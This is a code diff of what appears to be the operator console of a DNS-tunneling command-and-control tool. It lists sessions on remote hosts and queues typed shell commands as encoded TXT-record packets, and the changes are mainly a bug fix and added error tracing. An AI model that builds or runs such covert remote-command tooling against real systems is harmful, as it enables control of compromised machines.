@@ -5,7 +5,9 @@ from prompt_toolkit import PromptSession
 from prompt_toolkit.completion import Completer, Completion
 from prompt_toolkit.history import InMemoryHistory
 
+
 from lib.transport.encoding import encode
+
 
 # Global state (will be shared with server)
 console_buffer = {}
@@ -14,6 +16,7 @@ packet_queue = {}
 sessions_map = {}
 encryption_key = ""
 target_domain = ""
+
 
 
 class ShellCompleter(Completer):
@@ -60,6 +63,7 @@ class ShellCompleter(Completer):
                         display_meta=hostname
                     )              
 
+
 def display_sessions():
     """Display all active sessions with detailed information."""
     if not sessions_map:
@@ -96,6 +100,7 @@ def display_sessions():
         print(f"║ {guid_short:<20} │ {hostname_short:<19} │ {status:<19} ║")
     
     print("╚══════════════════════════════════════════════════════════════════╝\n")
+
 
 
 def interact(session_id: str):
@@ -154,26 +159,35 @@ def interact(session_id: str):
             if not line.strip():
                 continue
             
-            # Use client_guid here instead of None
-            init_packet, data_packets = encode(
+            # Encode command
+            # FIXED: encode() now returns ((init_packet, record_type), [(data_packet, record_type), ...])
+            (init_packet, init_type), data_packets = encode(
                 (line + "\n").encode(),
                 False,          # is_request = False for server->client
                 encryption_key,
                 target_domain,
-                client_guid
+                client_guid,
+                record_type='TXT'  # Server always uses TXT for now
             )
             
+            # Initialize queue if needed
             if session_id not in packet_queue:
                 packet_queue[session_id] = []
             
+            # Queue init packet (just the packet string, not the tuple)
             packet_queue[session_id].append(init_packet)
-            for packet in data_packets:
+            
+            # Queue data packets (extract just the packet string from each tuple)
+            for packet, record_type in data_packets:
                 packet_queue[session_id].append(packet)
     
     except Exception as e:
-        print(f"Error during interaction: {e}")
+        print(f"\nError during interaction: {e}")
+        import traceback
+        traceback.print_exc()
     finally:
         current_session = None
+
 
 
 def show_help():
@@ -197,7 +211,6 @@ def show_help():
     print("║ During Session:                                                  ║")
     print("║ background       │ Return to main menu (keep session alive)      ║")
     print("╚══════════════════════════════════════════════════════════════════╝\n")
-
 
 
 
@@ -305,6 +318,7 @@ def executor(command: str):
         print("Type 'help' for available commands")
 
 
+
 def run_cli():
     """Run the interactive CLI."""
     completer = ShellCompleter()
@@ -334,6 +348,9 @@ def run_cli():
             sys.exit(0)
         except Exception as e:
             print(f"Error: {e}")
+            import traceback
+            traceback.print_exc()
+
 
 
 if __name__ == "__main__":
